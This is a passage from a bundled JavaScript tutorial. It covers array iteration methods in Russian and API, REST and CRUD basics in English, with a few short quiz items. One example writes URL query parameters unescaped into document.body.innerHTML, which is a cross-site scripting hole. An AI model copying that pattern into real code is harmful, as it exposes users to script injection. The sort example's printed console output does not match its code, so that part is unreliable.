0].reduce(Math.sqrt))\n~~~\n\n{{{Array-iteration-methods-reduce-7.js}}}\n\nПервый и второй вариант - из числа 625 дважды извлечен квадратный корень:\n••625 -> 25 -> 5••\n^^Значения второго и третьего элементов массива не влияют на результат, поскольку не участвуют в вычислениях^^\nТретий вариант - квадратный корень будет извлечен всего один раз\n••625 -> 25••\nВ четвертом и пятом вариантах из числа 81 будет дважды извлечен квадратный корень:\n••81 -> 9 -> 3••\n^^Значения второго и третьего элементов массива опять-таки не влияют на результат, поскольку не участвуют в вычислениях^^\n\n_______________________________\n\nТеперь будем передавать методу **reduce** первым аргументом библиотечную функцию **Math.pow** (возведение в степень)\nЭта функция принимает два аргумента: число, которое нужно возвести в степень, и значение степени числа\n\n◘◘![ico-20 cap] **reduce (7)**◘◘\n\n~~~js\nconsole.log([3, 2, 2].reduce(Math.pow))    // 81\n\nconsole.log(Math.pow(Math.pow(3, 2), 2))   // 81\n\nconsole.log([2, 3, 3].reduce(Math.pow))    // 512\n\nconsole.log(Math.pow(Math.pow(2, 3), 3))   // 512\n\nconsole.log([2, 3, 4].reduce(Math.pow, 2)) // 16777216\n\nMath.pow(Math.pow(Math.pow(2, 2), 3), 4)   // 16777216\n~~~\n\nЕсли мы не передаем стартовое значение аккумулятора вторым аргументом метода **reduce**, то в этом качестве будет использовано значение первого элемента массива\nОстальные элементы массива будут значениями степени, в которую нужно возвести текущее значение аккумулятора\n\nЕсли же мы передаем стартовое значение аккумулятора, то все элементы массива будут рассматриваться как степень, в которую нужно возвести текущее значение аккумулятора\nНа каждой итерации значение аккумулятора будет уже результатом операции возведения в степень предыдущей итерации\n\n![ico-25 hw] Тесты\n\nЧто вернут следующие выражения:\n\n◘◘** 1**◘◘\n\n~~~js\n[].reduce(Math.pow)\n~~~\n\n◘◘** 2**◘◘\n\n~~~js\n[].reduce(Math.sqrt, 'Google')\n~~~\n\n◘◘** 3**◘◘\n\n~~~js\n[1].reduce(Math.sqrt, 'Google')\n~~~\n\n◘◘** 4**◘◘\n\n~~~js\n[-10, -20, 5].reduce(Math.abs)\n~~~\n\n◘◘** 5**◘◘\n\n~~~js\n[-10, -20, 5].reduce(Math.abs)\n~~~\n\nОбъясните, почему.\n\n_________________________________\n\nСоздадим массив банковских карт, и с помощью метода **reduce** посчитаем сумму средств на всех картах:\n\n◘◘![ico-25 cap] **reduce (8)**◘◘\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.reduce((result, card) => result + card.cash, 0)  // 10300\n~~~\n\n___________________________________________________\n\nСоздадим новую карту, на которую аккумулируем остатки на счетах все карт:\n\n◘◘![ico-25 cap] **reduce (8.1)**◘◘\n\n~~~js\ncards.reduce((result, card) => ({\n  num: result.num,\n  cash: result.cash + card.cash\n}), { num: '457855155', cash: 0 })\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ { num: \"457855155\", cash: 10300 }\n    cash: 10300\n    num: \"457855155\"\n  ► __proto__: Object\n\n~~~\n\n_________________________________________________\n\nДля чистоты результата дополнительно обнулим остатки на счетах других карт:\n\n◘◘![ico-25 cap] **reduce (8.2)**◘◘\n\n~~~js\ncards.reduce((result, card) => {\n  const cash = card.cash\n  card.cash = 0\n  return {\n    num: result.num,\n    cash: result.cash + cash\n  }\n}, { num: '457855155', cash: 0 })\n~~~\n\n**Теперь исходный массив карт будет:**\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {num: \"457892425\", cash: 0}\n  ► 1: {num: \"457812840\", cash: 0}\n  ► 2: {num: \"457855780\", cash: 0}\n  ► 3: {num: \"457811714\", cash: 0}\n    length: 4\n  ► __proto__: Array(0)\n\n~~~\n\n__________________________________________\n\nУдалим дублирующиеся элементы массива:\n\n◘◘![ico-25 cap] **reduce (8.3)**◘◘\n\n~~~js\nconst arr = [\n  'google',\n  'mozilla',\n  'ie',\n  'mozilla',\n  'mozilla',\n  'google',\n  'mozilla',\n  'ie',\n  'ie',\n  'google'\n]\n\narr.reduce((result, item) => {\n  result.indexOf(item) < 0 ? result.push(item) : null\n  return result\n}, [])\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (3) [\"google\", \"mozilla\", \"ie\"]\n    0: \"google\"\n    1: \"mozilla\"\n    2: \"ie\"\n    length: 3\n  ► __proto__: Array(0)\n\n~~~\n\n_________________________________________________\n\n![ico-25 cap] **reduce (9)**\n\nЗадача посложнее:\n\nЕсть несколько отрезков на числовой оси, таких, что начало и конец отрезков не совпадают\n\n~~~js\nconst segments = [[1, 8], [2, 3], [4, 7], [5, 6]]\n~~~\n\nДля каждого отрезка нужно посчитать, сколько отрезков лежит внутри него\n\n**Решение**\n\nНужно напилить код функции, которая будет:\n\n![ico-20 green-ok] получать в качестве аргумента исходный массив отрезков\n![ico-20 green-ok] перебирать полученный массив\n![ico-20 green-ok] для каждого отрезка в этом массиве считать число вложенных в него отрезков\n![ico-20 green-ok] возвращать результат в виде массива чисел\n\nКаркас функции:\n\n~~~js\nfunction countInnerIntervals (intervals) {\n  const results = []\n  intervals.forEach(...)\n  return results\n}\n~~~\n\nВнутри функции объявляется пустой массив **~results~**, куда мы будем помещать результаты подсчетов\n\nКогда итерирование исходного массива будет завершено, функция вернет массив результатов **~results~**\n\nТеперь методу **~forEach~** нужно передать функцию, которая будет \"работать\" с очередным отрезком\n\nЭто будет первый формальный параметр функции (назовем его **~segment~**)\n\nНо нам нужно будет внутри функции опять итерировать исходный массив, чтобы искать в нем отрезки, которые попадают в текущий отрезок **~segment~**\n\nДля этого нам необходим третий аргумент - ссылка на исходный массив\n\nПоэтому у функции будет три параметра: **~segment~**, **~index~**, **~array~**\n\nПараметр **~array~** будет содержать ссылку на исходный массив\n\n~~~js\nintervals.forEach(function (segment, index, array) {\n  ...\n}, results)\n~~~\n\nОбратите внимание, что методу **~forEach~** мы передаем обыную (не стрелочную!) функцию, поскольку мы биндим ей контекст вызова - **~results~**\n\nЭто позволит нам внутри функции пушить результаты в массив **~results~**, используя ключевое слово ~this~\n\n~~~js\nintervals.forEach(function (segment, index, array) {\n  this.push(...)\n}, results)\n~~~\n\nЕсли мы используем стрелочную функцию, то ее контекст вызова изменить будет невозможно, поэтому нам придется обращаться к массиву **~results~** непосредственно:\n\n~~~js\nintervals.forEach((segment, index, array) => results.push(...))\n~~~\n\nТеперь вопрос - что пушить в массив **~results~**\n\nОчевидно, что на каждой итерации это должно быть число, а не массив\n\nНо мы итерируем исходный массив, ссылку на который получаем в параметре **~array~**\n\nИтак, в параметре **~segment~** у нас ссылка на отрезок, для которого мы подсчитываем число входящих в него отрезков\n\nВ параметре **~array~** у нас ссылка на исходный массив отрезков\n\nНа каждой итерации нам нужно сравнить концы отрезка **~segment~** с концами каждого из отрезков массива **~array~**, чтобы понять, находится ли последний внутри отрезка **~segment~**\n\nДля этого можно использовать метод **~filter~**:\n\n~~~js\narray\n  .filter(item => item [0] > segment[0] && item [1] < segment[1])\n~~~\n\nРезультатом будет массив отрезков, попавших в заданный отрезок **~segment~**\n\nНам осталось только получить длину массива:\n\n~~~js\narray\n  .filter(item => item [0] > segment[0] && item [1] < segment[1])\n  .length\n~~~\n\nЭто и будет число отрезков, находящихся внутри отрезка **~segment~**\n\nИтак, полный код функции, передаваемой методу **~forEach~**:\n\n~~~js\nintervals\n  .forEach((segment, index, array) => results.push(array.filter(item => item [0] > segment[0] && item [1] < segment[1]).length))\n~~~\n\nТеперь полный код функции **~countInnerIntervals~** готов:\n\n~~~~js\nfunction countInnerIntervals (intervals) {\n  const results = []\n  intervals\n    .forEach((segment, index, array) => results.push(array.filter(item => item [0] > segment[0] && item [1] < segment[1]).length))\n  return results\n}\n~~~~\n\nА теперь та же функция, но с использованием метода **~reduce~**:\n\n~~~~js\nfunction countInnerIntervals (intervals) {\n  const results = []\n  intervals\n    .forEach((segment, index, array) => results.push(array.reduce((result, item) => result + (item [0] > segment[0] && item [1] < segment[1]), 0)))\n  return results\n}\n~~~~\n\nА теперь заменим метод **~forEach~** на метод **~map~**\n\n~~~~js\nfunction countInnerIntervals (intervals) {\n  return intervals\n    .map((segment, index, array) => array.reduce((result, item) => result + (item [0] > segment[0] && item [1] < segment[1]), 0))\n}\n~~~~\n\nили с использованием стрелочной функции:\n\n~~~~js\nconst countInnerIntervals = intervals => intervals\n  .map(segment => intervals.reduce((result, item) => result + (item [0] > segment[0] && item [1] < segment[1]), 0))\n~~~~\n\nМожно использовать замыкание для вспомогательных функций, тогда код становится более читабельным:\n\n~~~js\nconst countInnerIntervals = (function () {\n  const test = (segment, interval) => interval[0] > segment[0] && interval[1] < segment[1]\n  const filter = (intervals, segment) => intervals.filter(interval => test(segment, interval))\n\n  return function (intervals) {\n    const results = []\n    const filterInterval = filter.bind(null, intervals)\n\n    intervals\n      .forEach(segment => results.push(filterInterval(segment).length))\n    return results\n  }\n})()\n~~~\n\nОсталось только вызвать функцию:\n\n~~~js\nconsole.log(countInnerIntervals(segments))\n~~~\n\n__________________________\n\n### ![ico-25 icon] sort()\n\nВ полном смысле слова этот метод нельзя назвать методом итерирования массива, поскольку число итераций больше чем число элементов массива\n\nОднако итерации имеют место быть\nИ перебор элементов массива налицо\n\nМетод сортирует массив согласно заданному условию сортировки\nУсловие сортировки проверяет передаваемая методу функция\n_Функция получает два аргумента для попарного сравнения_\n\nФункция возвращает одно из трех значений:\n\n|  0 | совпадение элементов           |\n|  1 | первый аргумент больше второго |\n| -1 | второй аргумент больше первого |\n\n\nНа основании возвращенного функцией значения метод меняет порядок следования элементов в массиве\n\n◘◘![ico-20 cap] **sort (1)**◘◘\n\n~~~js\nvar sourceArray = [\n  { title: 'fond', value: 100 },\n  { title: 'salary', value: 400 },\n  { title: 'bonus', value: 70 },\n  { title: 'debt', value: 700 },\n  { title: 'credit', value: 200 },\n  { title: 'payments', value: 150 },\n  { title: 'income', value: 320 },\n]\nvar resArray = sourceArray.sort(function (x, y) {\n  return x.value - y.value\n})\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {title: \"bonus\", value: 70}\n  ► 1: {title: \"fond\", value: 100}\n  ► 2: {title: \"payments\", value: 150}\n  ► 3: {title: \"credit\", value: 200}\n  ► 4: {title: \"income\", value: 320}\n  ► 5: {title: \"salary\", value: 400}\n  ► 6: {title: \"debt\", value: 700}\n    length: 7\n  ► __proto__: Array(0)\n\n~~~\n\n\nДля понимания механизма сортировки выведем в консоль значения сравниваемых элементов массива на каждой итерации:\n\n◘◘![ico-20 cap] **sort (2)**◘◘\n\n~~~~js\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    console.log ( `${x.title} - ${y.title} = ${x.value - y.value}` )\n    return  x.value - y.value\n  })\n~~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\nfond - bonus = 30\npayments - fond = 50\ncredit - payments = 50\nincome - credit = 120\nsalary - income = 80\ndebt - salary = 300\n\n~~~\n\nили так:\n\n~~~~js\nvar tmp =[]\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    tmp.push({\n      id: x.title + \" > \" + y.title,\n      res: x.value > y.value\n    })\n    return  x.value - y.value\n  })\n~~~~\n\n^^^[tmp]\n\n~~~console\n\n▼ (13) [...]\n  ► 0: \"salary - fond = 300\"\n  ► 1: \"bonus - salary = -330\"\n  ► 2: \"bonus - salary = -330\"\n  ► 3: \"bonus - fond = -30\"\n  ► 4: \"debt - fond = 600\"\n  ► 5: \"debt - salary = 300\"\n  ► 6: \"credit - salary = -200\"\n  ► 7: \"credit - fond = 100\"\n  ► 8: \"payments - credit = -50\"\n  ► 9: \"payments - fond = 50\"\n  ► 10: \"income - credit = 120\"\n  ► 11: \"income - debt = -380\"\n  ► 12: \"income - salary = -80\"\n    length: 13\n  ► __proto__: Array(0)\n\n~~~\n\n^^^\n\nИтак, в отличие от других итерирующих методов, функция, передаваемая методу в качестве единственного аргумента, принимает строго два параметра\n\n![ico-20 warn] Этому методу нельзя передать ссылку на контекст вызова\n![ico-20 warn] Число итераций будет заведомо больше числа элементов массива\n\n![ico-20 require] Самостоятельно попробуйте нарисовать блок-схему алгоритма сортировки массива методом  **~sort()~**\n\n__________________________\n\n### ![ico-25 icon] flatMap()\n\nЕсть строка **cookie**:\n\n◘◘![ico-20 cap] **flatMap**◘◘\n\n~~~js\nvar cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n~~~\n\nСплитим строку **cookie** и применим метод **~map~** к полученному массиву\n\n~~~js\nconsole.log(cookie.split('; ').map(item => item.split('='))\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (3) [Array(2), Array(2), Array(2)]\n  ► 0: (2) [\"name\", \"user\"]\n  ► 1: (2) [\"token\", \"Jd7-js15/84\"]\n  ► 2: (2) [\"interest\", \"javascript\"]\n    length: 3\n  ► __proto__: Array(0)\n\n~~~\n\nМы получили массив, элементы которого являются массивами\n\nТеперь применим метод **~flatMap~** к массиву **cookie**\n\n~~~js\nconsole.log(cookie.split('; ').flatMap(item => item.split('='))\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n► (6) [\"name\", \"user\", \"token\", \"Jd7-js15/84\", \"interest\", \"javascript\"]\n~~~\n\nМы получили \"плоский\" массив\n\nИтак, используя одну и ту же функцию:\n\n~~~js\nfunction (item) {\n  return item.split('=')\n}\n~~~\n\nмы получили в первом случае массив массивов, а во втором - \"плоский\" массив\n\n____________________________________________________\n\n### ![ico-25 icon] keys()\n\n**Генератор**\n**Возвращает объект _итератора_**\n\n◘◘![ico-20 cap] **keys**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n  .split('; ')\n  .map(item => item.split('='))\n\nconst iterator = cookie.keys()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(cookie[value][0], cookie[value][1])\n} while (!done)\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\nname user\ntoken Jd7-js15/84\ninterest javascript\n\n~~~\n\n\n______________________\n\n### ![ico-25 icon] values()\n\n**Генератор**\n**Возвращает объект _итератора_**\n\n◘◘![ico-20 cap] **values**◘◘\n\n~~~js\nconst iterator = 'name=user; token=Jd7-js15/84; inerest=javascript'\n  .split ('; ')\n  .map(item => item.split('=')).values()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(value)\n} while (!done)\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n► (2) [\"name\", \"user\"]\n► (2) [\"token\", \"Jd7-js15/84\"]\n► (2) [\"inerest\", \"javascript\"]\n\n~~~\n\n_____________________________________________\n\n\n## ![ico-25 icon] Примеры и тесты\n\n^^Спасибо **Антону Бурчак** за эту задачку ![ico-20 smile]^^\n\nЗадача: проверить парность и правильность расстановки скобок\n\nНапример, валидация строки \"({})[([])]\" должна пройти нормально ( вернуть ~true~ )\nа валидация строки \"({(})[([)])]\" должна вернуть ~false~\n\nДля удобства использования создадим наследуемый метод строк:\n\n◘◘![ico-20 cap] **Brackets validation**◘◘\n\n~~~js\nString.prototype.testBrackets = (function () {\n  const brackets = {\n    '[': ']',\n    '{': '}',\n    '(': ')'\n  }\n\n  const all = ['[', '{', '(', ']', '}', ')']\n\n  return function () {\n    const self = this\n      .split('')\n      .filter(char => all.includes(char))\n\n    let stack = [], result = ''\n\n    self\n      .forEach(symbol => {\n        if (!brackets[symbol] && stack.length === 0) return false\n\n        brackets[symbol] ? stack.push(symbol) : symbol = brackets[stack.pop()]\n\n        result += symbol\n      })\n\n    return result === self.join('') && stack.length === 0\n  }\n})()\n~~~\n\n~~~js\n'( [ ( { ( ( {(} ([]) ) ) } ) ] )'.testBrackets()   // false\n\nString.prototype.testBrackets.toString().testBrackets()  // true\n~~~\n\n{{{Array-iteration-methods-brackets.js}}}\n___________________________________________________\n\n◘◘![ico-20 cap] **map**◘◘\n\n~~~js\nfunction getSearchObject () {\n  const obj = {}\n\n  location.search\n    .slice(1)\n    .split(',')\n    .map(x => x.split('='))\n    .map(function (item) { this[item[0]] = item[1] }, obj)\n\n    return obj\n}\n\nvar searchObject = getSearchObject ()\nfor (const rec in searchObject) {\n  document.body.innerHTML += `<p>${rec}: ${searchObject[rec]}</p>`\n}\n~~~\n\n[:::**Live demo**:::](samples/11)\n\n_____________________________________________\n\nПерейдите по [**_ссылке_**](https://en.wikipedia.org/wiki/Idempotence) и в консоли страницы выполните код:\n\n◘◘![ico-22 cap] **getComputedStyle**◘◘\n\n~~~js\nArray.from(document.getElementsByClassName('interlanguage-link'))\n  .map(item => getComputedStyle(item))\n  .forEach(item => console.log(item['font-family']))\n~~~\n\n________________________________________________\n\n[![ico-30 hw] Тесты](quiz/arrayIterationMethods)\n"},60347:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\n#![ico-70 warn] 303\n\nSee Other\n\n----------\n\nI apologise, the translation of this material is in process.\nYou can view this topic in ^^russian^^, or wait until the translation will be completed.\n"},19499:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] API\n\n[** ♫**](sounds/eng/api.mp3)\n\n**_Application Programming Interface_** (**API**) allows two systems to communicate with each other.\n\n@@@@\n![](illustrations/api-02.png)\nSuppose there is a set of services external to your application that greatly extend the functionality of your application.\nIf there is some kind of API that provides you with access to these services, then this is an API.<br>That is, you do not need to include these services in your application, it does not matter to you what language they are written in, you only need to know how to activate them.\n![](illustrations/api-01.png)\n@@@@\n\n_________________________\n\nRunning on the client, your code constantly uses [**client-side web APIs**](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/)<br>(e.g., **~DOM API~**, **~Audio API~**, **~Fetch API~**, **~File API~**, **~Notification API~**, **~IndexedDB API~**).\n\n[![ico-25 link] Web APIs](https://developer.mozilla.org/en-US/docs/Web/API/)\n\nYou can connect to many web APIs remotely (e.g., [![ico-70 firebase]](https://firebase.google.com/) or [![ico-35 google-maps]](https://developers.google.com/maps/documentation/javascript/)).\n_________________________\n\n## ![ico-25 icon] CRUD\n\n[** ♫**](sounds/eng/api-crud.mp3)\n\nAs a rule, any application interacts with its backend API on the server.\nA backend API provides an application with access to data stored on the server using **CRUD** methods.\n\n^^^[CRUD]\n\n**CRUD** (_create_, _read_, _update_, _delete_) are the four basic types of requests to the server.\n\nTo identify the type of request, an **access method**, or **verb**, is used to identify the operation on the resource.\n\n| **GET** | **POST** | **PUT** | **PATCH** | **DELETE** | **HEAD** |\n\n| ~read~   | **GET**    | retrieve the data                            |\n| ~create~ | **POST**   | create new resource (new record)             |\n| ~update~ | **PUT**    | update existing resource by id               |\n| ~update~ | **PATCH**  | partial update of an existing resource by id |\n| ~delete~ | **DELETE** | delete resource by id                        |\n| ~read~   | **HEAD**   | retrieve information about the resource      |\n\n^^You don't care whether the data is stored on the server as separate files or as records in a database.^^\n\n^^^\n____________________\n\n## ![ico-25 icon] Request & Response\n\n[** ♫**](sounds/eng/api-request-response.mp3)\n\nAny API works on the principle of \"request\" — \"response\".\nYour application sends a request, and if the request is valid, the API sends a response to the application.\n\nThe form of the request depends on the API.\nThis can be a method such as, **~setTimeout~** or **~fetch~**.\nThis can be an object whose properties and methods give you access to the capabilities of the browser API. All **~BOM~** and **~DOM~** objects are elements of the browser API.\nThis can be a constructor that you use to create objects that give you access to the capabilities of the browser API. For example, the **~XMLHttpRequest~** constructor or the **~FileReader~**.\n\n__________________________________\n\n### ![ico-25 icon] Resource\n\n[** ♫**](sounds/eng/api-resource.mp3)\n\nThe main thing when interacting with the server API is to determine the concept “resource” and assign a unique identifier to each resource.\n\n^^For example, the resource can be information about the user. Then, knowing the unique identifier of the resource, you can send a request to the server API to obtain user data by its identifier (**GET**), you can send a request to change user data (**PUT** or **PATCH**) or send a request to create a new user (**POST**).^^\n\nThus, when interacting with a remote API, by the term “resource” we mean a **certain piece of information that has a unique identifier**.\n\n^^The difference between **URL** (Uniform Resource Locator) and **URI** (Uniform Resource Identifier) ​​is precisely that the **URL** specifies the exact location of the resource on the server, while the **URI** specifies only the resourceid. **URI** provides greater flexibility of the server API in terms of data placement and the form of its storage.^^\n\nA resource can be a file stored on a server or a single record in a database.\n\nFor example, an image file may be stored on the server, but the same image may be stored in the database as a text string in the format of [**Base64**](https://www.base64encode.org/).\n\n_____________________________________\n\n## ![ico-25 icon] API endpoints\n\n[** ♫**](sounds/eng/api-endpoints.mp3)\n\nEach API has documentation and specifications that define how information is transferred.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-01.png)\n^^^\n\nAPIs can use HTTP requests to obtain information from a web application or web server.\n\nIn the case of a REST API, the request is made over the Internet, and takes the form of a certain web address called **~endpoint~** (access point to the remote API).\n\n^^^[![](icons/endpoint-icon.png)]\n^^The term \"endpoint\" is used not only in the context of REST APIs, but also in a broader sense in the field of information technology and networking.^^\n^^• In network protocols, endpoint can refer to any communication endpoint in a network, whether it is an IP address and port in TCP/IP, or an endpoint in message routing.^^\n^^• In SOAP (Simple Object Access Protocol) API endpoint also denotes the URL to which SOAP messages are sent. This is similar to the REST API, but is used in other protocols and data formats.^^\n^^• In the GraphQL API endpoint represents a single endpoint through which a client can request specific data using complex queries.^^\n^^• In microservices, an endpoint can denote any entry point for interacting with an individual microservice. Each microservice can have its own endpoints for different functionality.^^\n^^• More generally, an endpoint can refer to any point through which a resource or service is accessed, whether within a system or between different systems.^^\n^^^\n\n**~endpoint~** is a URI-like string that the API provides to you to access resources remotely.\n\nLet's figure out what this line includes.\nLet's start with the fact that API itself has **URL**, for example: ~https://api.example.com~. And this **URL** will be present in every endpoint.\nHowever, to access a resource, you need to specify which resource you are interested in and what you want to do with this resource (get a resource, create a new one, delete or update an existing one).\n**~endpoint~** contains all this information.\n\nAs we said earlier, each resource has a unique identifier and a number of different operations can be performed on each resource (read, create, delete, update/change).\n\nThus, **~endpoint~** is neither a **URL** (because it contains no information about the location of the resource) nor a **URI** (because it includes not only the resource identifier, but also information about the operation of the resource).\n\n![ico-25 warn] If some operation on a resource is valid, then there is an **~endpoint~** for it.\n![ico-25 warn] If there is no such **~endpoint~**, then this operation with the resource is impossible.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-02.png)\n^^^\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-04.png)\n^^^\n\n^^^[![](icons/coffee.png)]\n^^Let's take the example of the ~https://api.example.com~ API.^^\n^^Suppose you have a database of users stored on a server.^^\n^^API allows you to get a list of all the users and gives you a **~endpoint~** to do this:^^\n\n••https://api.example.com/users/all••\n\n^^To get the information of a specific user with a unique identifier **iserId** the endpoint will be different:^^\n\n••https://api.example.com/users/${iserId}••\n\n^^To create a new user (**POST**):^^\n\n••https://api.example.com/user/create••\n\n^^For complete replacement of all user data (**PUT**):^^\n\n••https://api.example.com/user/change/${iserId}••\n\n^^For partial modification of user data (**PATCH**):^^\n••https://api.example.com/user/update/${iserId}••\n\n^^And to delete a user (**DELETE**):^^\n\n••https://api.example.com/user/remove/${iserId}••\n\n^^The server API parses the request address, and if this string matches one of the valid options, and if you have permissions to perform such operations, your request is executed.^^\n\n^^^\n\nAn endpoint in a REST API is the point that the client accesses to interact with the server.\nIt is not just a URL, but a combination of an API address and a route, which includes a resource identifier and information about what action to perform. It's like a web address, but with extra parts that specify what exactly needs to be done with the data.\n______________________________________________\n\n## ![ico-25 icon] web service\n\n**Terms:**\n\n• ^^![ico-20 pin] **SOA** is a service-oriented architecture of web applications (a set of architectural principles).^^\n• ^^![ico-20 pin] **RPC** is a remote procedure call.^^\n• ^^![ico-20 pin] **Service** is a set of operations that accept a Request and issue a Response.^^\n• ^^![ico-20 pin] **Web service**  is a software system identified by a web address with standardized interfaces.^^\n\nWeb services can communicate with each other and with other applications using notifications based on specific protocols.\n\nThe most widely used protocols for implementing web services are:\n\n![ico-20 green-ok] **SOAP**    (_Simple Object Access Protocol_)\n![ico-20 green-ok] **REST**    (_Representational State Transfer_)\n![ico-20 green-ok] **XML-RPC** (_XML Remote Procedure Call_)\n\n_________________________________________\n\n### ![ico-20 icon] REST API\n\nThe basic principle of **REST** is to limit the set of operations — only **CRUD** (~Create~ ~Read~ ~Update~ ~Delete~) operations are used.\n\nThe architectural style of **REST** in most cases involves the use of the **HTTP** protocol.\n\nTherefore, **CRUD** commands have been converted to **~POST~** — **~GET~** — **~PUT~** — **~DELETE~** **HTTP** methods.\n\n^^^[![](icons/postman.png)]\n![](illustrations/api-rest-postman.png)\n^^^\n\n___________________________________________\n\n### ![ico-20 icon] SOAP vs REST\n\nAPIs are typically classified as **SOAP** or **REST**, and both are used to access web services.\n\n![ico-20 green-ok] **SOAP**: XML is used for messaging.\n![ico-20 green-ok] **REST**: URLs are used to receive or send information.\n\n**REST** uses four different HTTP 1.1 verbs (~GET~, ~POST~, ~PUT~ и ~DELETE~).\n\nUnlike SOAP, REST doesn't have to use XML to provide a response.\n\nThere are REST-based web services that output data in the following format:\n\n| ^^• Command Separated Value (CSV)^^ |\n| ^^• JavaScript Object Notation (JSON)^^ |\n| ^^• Really Simple Syndication (RSS)^^ |\n\n^^You can get the result in a format that is easier to parse in the language of your application.^^\n\n_____________________________________\n"},9343:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Deeper into iterating methods\n\n[◄◄◄ Array iterating methods ◄◄◄](page/Array-iterating-methods.md)\n\nBy displaying the **_~prototype~_** property of the **~Array~** constructor in the console, we can see that these data structures inherit many methods, and some of them we already know.\n\n~~~js\nconsole.log(Array.prototype)\n~~~\n\n{{{Array-iteration-methods-theory.js}}}\n\nSome of the methods that we are already familiar with perform some kind of operation on the array.\n^^(add an element to an array, remove or replace elements in an array, merge several arrays into one, etc.).^^\n\nIterating methods loop through the array elements one by one strictly in ascending order of their indices.\n^^(except ~reduceRight~, which is right-to-left).^^\n\n_A group of array iterating methods is an example of an implementation of the **functional paradigm**._\n\nThe main thing to remember about array iterating methods are **higher-order functions**.\nThis will remind you that ![ico-20 warn] the **first and required argument of an iterative method is a function**.\n\n• The method will iterate over the elements of the array one by one until it reaches the end of the array.\n• At each iteration, the method will call the **argument function** passed to it.\n• When an **argument function** is called, the method will pass it the value of the current element of the array.\n\n_____________________________________________\n\n## ![ico-25 icon] Cycle decorator\n\nThe advantages of methods over loop operators are obvious.\nFor example, with the help of methods, we organize chain calculations, and loop operators \"break\" a beautiful chain, breaking the harmony of our code.\n\nLoops require a lot of routine work from us: we need to initialize the loop variable, determine how it will change in each iteration, control its value in order to complete the loop in time. In short, we need to create a mechanism of cycle with your own hands. We won't even discuss the possible mistakes that arise in this case.\n\nLoops ~for...of~ and ~for...in~ greatly facilitated the work of iterating on arrays and objects. However, these are still loop operators, not methods.\n\nWhen we wrap a loop in a function (method), we enable on-chain computing.\n\nSo, iterative methods can be interpreted as functional \"wrappers\" for **~for...of~** operator.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\nIn this example, we've created a custom inherited method of arrays **~iterate~**\nwith the formal parameter ~func~ (^^function^^),\nwhich iterates through the original array in a **~for...of~** loop\nand on each iteration calls ~func~,\npassing to it the next element of the initial array.\n\nIn this example, **~iterate~** method returns nothing,\nand it does not mutate the original array, i.e. it does not produce **external effects**.\n\nThe same result can be achieved with the help of recursion:\n\n~~~js\nArray.prototype.iterate = function (func, index) {\n  if (typeof func !== 'function') throw new TypeError('First argument is not a function.')\n  let number = typeof index === 'number' ? index : 0\n  func(this[number])\n  number++ < this.length - 1 && this.iterate.call(this, func, number)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\n_____________________________________________\n\nIf we want the method to return a new array, all we need to do is the next:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js   \nArray.prototype.iterate = function (func) {\n  const res = []\n  for (const item of this) res.push(typeof func === 'function' ? func(item) : item)\n  return res\n}\n\n;[49, 4, 25].iterate(Math.sqrt)\n~~~\n\nResult:\n\n~~~console\n► (3) [7, 2, 5]\n~~~\n\nAs a result, the custom method **~iterate~** will “collect” into the **res** array\nthe results of calling the function ~func~ at each iteration,\nand return the **res** array.\n\n~~~js\nconst squaring = num => Math.pow(num, 2)\n;[7, 2, 5].iterate(squaring)\n~~~\n\nResult:\n\n~~~console\n► (3) [49, 4, 25]\n~~~\n\n_____________________________________________\n\nWe can create a custom method that filters the source array in accordance with a given condition.\nThe function **~func~** should now return a **boolean value**.\nIf the function **~func~** returns ~true~ for the next array element, then this element will be included in the resulting array **res**.\nOtherwise, no.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nArray.prototype.filtering = function (func) {\n  const res = []\n  for (const item of this) func(item) && res.push(item)\n  return res\n}\n\nconst func = num => num < 10\n;[108, 24, 5, 17, 1, 7].filtering(func)\n~~~\n\nResult:\n\n~~~console\n► (3) [5, 1, 7]\n~~~\n\n~~~js   \n[7, 4, 1, 20, 8].filtering(item => item > 5)\n~~~\n\nResult:\n\n~~~console\n► (3) [7, 20, 8]\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Transferring references\n\n@@@@\n![](images/reference-is-a-lockpick.png)\nAt this point, the functional purity of iterating methods, unfortunately, ends.<br><br>A function can mutate an object by reference.<br><br>In this case, as a rule, **side effects** occur.\n@@@@\n\nThere are two ways to pass references in array iterating methods.\nThe first one is passing a reference to the **call context** of the **function-argument** by the second argument of the method.\nThe second is passing the reference to the source array to the **function-argument** itself when calling it.\n\n### ![ico-20 icon] The 